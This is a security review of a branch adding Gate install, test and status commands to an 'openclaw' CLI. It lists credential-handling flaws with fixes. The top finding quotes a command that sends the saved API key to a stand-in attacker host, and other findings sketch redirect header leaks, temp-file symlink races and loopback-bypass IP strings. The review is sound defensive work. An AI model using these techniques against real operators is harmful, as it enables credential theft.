# Security review — feat/AG-57-gates-setup

## Summary
The Gate install/test/status flow correctly reuses the `validateGatewayUrl` /
`validateGatewayApiKey` validators for its happy paths, and the primary config
file is written with mode 0o600. However, the credential moves through a few
secondary paths — the `.bak` snapshot, an unconstrained `audit gate test --url`
override, and an unredirect-locked outbound probe — where the same care is not
applied. The most urgent finding is the `--url` override on `gate test` which
sends the on-disk API key to any attacker-supplied https host that passes the
SSRF validator; the `.bak` mode and fetch-redirect defaults are the next two.

## Findings

### [H] `audit gate test --url <attacker>` exfiltrates the saved API key
**File:** src/cli-gate.ts:141-171
**Threat:** Anyone who can convince an operator to run `openclaw audit gate test --url https://attacker.example.com` (no `--api-key`) gets the operator's Gate API key POSTed to their server in the `X-Gateway-Api-Key` header.
**Issue:** When `--url` is supplied without `--api-key`, the handler still falls into the `apiKey ?? readApiKeyFromConfig(...)` branch (line 153) and probes the attacker URL with the on-disk key; `normalizeAndValidateUrl` only enforces SSRF/cleartext policy, not "matches configured URL", so any public-looking https URL is accepted.
**Suggestion:** If `--url` is overridden, require `--api-key` to also be overridden (refuse to load the saved key for a non-configured destination), or compare the override host to the persisted `status.url` host and refuse when they differ.

### [H] fetch follows redirects with the API-key header attached
**File:** src/services/gate-client.ts:43-51
**Threat:** A compromised or malicious Gate at the configured URL can 302 the probe to an arbitrary host (including private/link-local SSRF targets) and Node's undici will resend `X-Gateway-Api-Key` to that host — bypassing the URL validator that ran pre-probe.
**Issue:** `fetchImpl(url, { method, headers, body, signal })` does not pass `redirect: "manual"` (or `"error"`), so the default `"follow"` applies; undici forwards arbitrary request headers across cross-origin redirects.
**Suggestion:** Set `redirect: "manual"` on the probe (a 3xx is then surfaced as `http-error` instead of being chased) so the key never leaves the URL the operator authorized.

### [M] `.bak` snapshot of `config.json` is written world-readable
**File:** src/util/openclaw-config-writer.ts:71-78
**Threat:** Any other local user on the host can read the previous Gate API key (and any other secrets) from `~/.openclaw/config.json.bak` after the operator runs `audit gate install` to rotate keys or change URLs.
**Issue:** `writeFileSync(`${path}.bak`, prior)` omits the `mode` option, so the file inherits the default 0o666 & umask (typically 0o644 / 0o664). Confirmed empirically: a 0o600 source produces a 0o664 .bak on this host. The atomic-write tempfile (line 83) sets 0o600 correctly; only the snapshot path is wrong.
**Suggestion:** `writeFileSync(`${path}.bak`, prior, { mode: 0o600 })`. (Same fix likely warranted for any future snapshot paths.)

### [M] Tempfile for atomic write is at a predictable path inside `~/.openclaw`
**File:** src/util/openclaw-config-writer.ts:80-84
**Threat:** A local attacker who can write into `~/.openclaw` (group-writable mis-permission, or a previous compromise) can predict `${path}.tmp-<pid>-<ms>` and pre-create it as a symlink to an attacker-controlled path, redirecting the operator's API-key-bearing config to an attacker file before `renameSync` swaps it in.
**Issue:** Tempfile name is `pid`+`Date.now()` (both predictable) and `writeFileSync` does not pass `flag: "wx"`, so an existing target is silently overwritten/followed. Risk is contained to hosts where `~/.openclaw` is not 0o700, but the writer doesn't enforce that.
**Suggestion:** Pass `flag: "wx"` to the tempfile write (refuse to overwrite), and/or `mkdirSync(dir, { recursive: true, mode: 0o700 })` so the parent dir is owner-only when this code path creates it.

### [M] Userinfo-bearing URL bypasses no validator check and is echoed back to stdout
**File:** src/services/gate-installer.ts:45-52, src/cli-gate.ts:124, src/cli-gate.ts:178
**Threat:** An operator who pastes `https://user:secret@gate.example.com` (e.g. from a misconfigured doc) gets the embedded basic-auth credential written to `config.json` and reflected to terminal/logs by `audit gate status` / `audit gate test`.
**Issue:** `validateGatewayUrl` checks `url.hostname` only; `new URL()` parses userinfo silently and `outLine(`Gate URL: ${status.url}`)` (status) / `outLine(`Gate URL: ${url}`)` (test) print the full `href` form.
**Suggestion:** Reject URLs whose `username`/`password` are non-empty in `validateGatewayUrl` (or strip them in `normalizeAndValidateUrl` before persistence) — they're never needed alongside the `X-Gateway-Api-Key` header.

### [L] API key passed via `--api-key` flag leaks to process table and shell history
**File:** src/cli-gate.ts:23-50, README.md:24-28
**Threat:** Any local user can `ps auxf` and read the key while `openclaw audit gate install --api-key sk-… --yes` is running; the same key lingers in the operator's shell history.
**Issue:** The README's non-interactive example invokes the command with the literal key in argv; the implementation has no env-var or `--api-key-stdin`/`--api-key-file` alternative.
**Suggestion:** Add `--api-key-stdin` (read from fd0) and `OPENCLAW_GATE_API_KEY` env-var support; update README to recommend those for CI rather than inlining the flag.

### [L] Server-supplied response body is reflected verbatim in installer error / `gate test` output
**File:** src/services/gate-installer.ts:88-93, src/cli-gate.ts:185, src/cli-gate.ts:190
**Threat:** A malicious/misconfigured Gate that echoes the submitted API key in its 4xx/5xx response body causes the key to be reflected to the operator's terminal (and any captured stderr/stdout in CI). Today no in-tree Gate does this; future Gate variants or a MitM-substituted server might.
**Issue:** `probe.body` is `safeText(res)` (control chars not stripped, just truncated at 500B) and is concatenated into `Gate returned HTTP X. Body: <body>`; gateway-publisher.ts has a `sanitizeForLog` helper that this caller does not invoke.
**Suggestion:** Reuse `sanitizeForLog(body, 500)` (or equivalent) before printing — drops CR/LF/ANSI/log-spoofing chars and would also redact bytes matching the just-submitted API key.

### [L] Multi-line paste at the secret prompt commits partial key to shell history
**File:** src/cli-gate.ts:240-282
**Threat:** Operator pastes a copied API key that accidentally contains a trailing newline plus another line; the first `\r`/`\n` terminates input (correctly), but everything after it lands in the shell as the next command — disclosing the trailing fragment to history/`PROMPT_COMMAND` logging.
**Issue:** `promptSecret` reads one chunk at a time and processes byte-by-byte; once a newline resolves the promise it pauses stdin via `stdin.pause()`, but bytes already in the kernel pipe buffer (from a multi-byte paste) are flushed to the shell after the process exits.
**Suggestion:** Drain stdin (or keep raw mode on until EOF/timeout) before resolving, or document the risk and recommend `--api-key-stdin` for paste-heavy workflows.

### [L] `~/.openclaw` directory may be created world-traversable
**File:** src/util/openclaw-config-writer.ts:68-69
**Threat:** Other local users can `ls ~/.openclaw` (filenames only; config.json itself is 0o600), which exposes the presence of `.bak` files / install state.
**Issue:** `mkdirSync(dir, { recursive: true })` uses the default 0o777 & umask, typically 0o755.
**Suggestion:** Pass `{ recursive: true, mode: 0o700 }` so the dir is owner-only.

## Verified safe
- `JSON.parse` of `config.json` — Node's parser is prototype-pollution-safe (no `__proto__` walking when read via `JsonObject`-typed accessors), and `readGateStatus` guards every nested lookup with `isObject(...)` so a hostile shape (`plugins = "string"`, `entries = []`, etc.) does not crash or pollute prototypes.
- `validateGatewayUrl` reuse — `normalizeAndValidateUrl` correctly calls it for both `install` and `test`, including the `--allow-private-host` opt-in surface, and `installGate` re-passes the validator output (no bypass branch).
- `validateGatewayApiKey` — `validateApiKeyOrThrow` is called from both flows; the regex denies CR/LF/space/quote/control-char header smuggling. The probe header construction uses the validated value verbatim with no string interpolation that would re-introduce smuggling.
- API-key never logged in install/test happy paths — `outLine`/`errLine` callsites grep clean; `status` reports `hasApiKey: boolean` only; `report.changes` returns dotted-path keys, not values.
- Atomic write — `renameSync` of fsync'd tempfile is correctly POSIX-atomic; on success the prior 0o600 mode of the target is replaced by the tempfile's 0o600 (verified by reading writeFileSync semantics + Node fs source).
- TOCTOU probe→write — the probe and write are sequential in `installGate`, and the only state shared is the operator-supplied URL/key (held in closures, never re-read from disk between calls). An attacker with write to `~/.openclaw` already owns the credential.
- Interactive prompt terminal-escape injection — escape bytes in pasted input are not echoed (raw mode, no `stdout.write(ch)`), and are subsequently rejected by `validateGatewayApiKey`'s allowlist regex, so a pasted ANSI payload cannot corrupt the terminal or pass validation.
- Numeric-IP / loopback bypass — `validateGatewayUrl` rejects `2130706433`, `0x7f000001`, `0177.0.0.1`, and matches `127.x`, `::1`, `::ffff:127.x` as loopback; the install/test flows both route through it.
- `Content-Type: application/json` + JSON body — the probe sends a static `{ events: [] }` payload, so request-smuggling/CRLF-in-body attacks via operator-controlled input are not possible (operator never controls the body).

## Open questions
- Does the operator's `~/.openclaw` already exist with restrictive perms in normal openclaw installs? If so the dir-mode finding (L, world-traversable) is moot; if openclaw itself creates it 0o755 the installer should still tighten it.
- Does undici, on a cross-origin 3xx, downgrade or strip `X-Gateway-Api-Key`? I'm asserting "no" based on the WHATWG Fetch spec ("redirect to a different origin keeps custom headers unless `Authorization`/cookie-like") — worth a quick empirical check before fixing the redirect finding, but the safe move is `redirect: "manual"` regardless.
